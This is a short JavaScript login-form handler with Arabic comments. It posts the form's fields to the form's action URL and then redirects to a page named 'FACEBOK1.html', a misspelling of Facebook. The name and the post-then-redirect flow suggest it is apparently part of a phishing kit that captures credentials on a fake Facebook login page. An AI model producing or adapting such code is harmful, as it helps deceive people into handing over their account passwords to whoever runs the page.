document.getElementById('loginButton').addEventListener('click', function(event) {
    event.preventDefault(); // منع الإرسال الافتراضي للنموذج

    var button = this; // الإشارة إلى الزر

    // تعطيل الزر لمنع الضغط المتكرر
    button.disabled = true;

    // إرسال النموذج باستخدام Fetch API
    var form = document.getElementById('loginForm');
    
    // إنشاء كائن FormData لجمع بيانات النموذج
    var formData = new FormData(form);
    
    // إرسال البيانات إلى الرابط الأول
    fetch(form.action, {
        method: form.method,
        body: formData
    }).then(response => {
        if (response.ok) {
            // بعد إرسال النموذج بنجاح، نعيد توجيه المستخدم مباشرة
            window.location.href = 'FACEBOK1.html'; // الرابط الثاني
        } else {
            // عرض رسالة خطأ في حالة عدم نجاح الإرسال
            document.getElementById('error-message').textContent = 'معلومات الاتصال غير صحيحة';
            document.getElementById('error-message').style.display = 'block';
            button.disabled = false;
        }
    }).catch(error => {
        console.error('Error:', error);
        // عرض رسالة خطأ في حالة حدوث خطأ
        document.getElementById('error-message').textContent = 'معلومات الاتصال غير صحيحة';
        document.getElementById('error-message').style.display = 'block';
        button.disabled = false;
    });
});
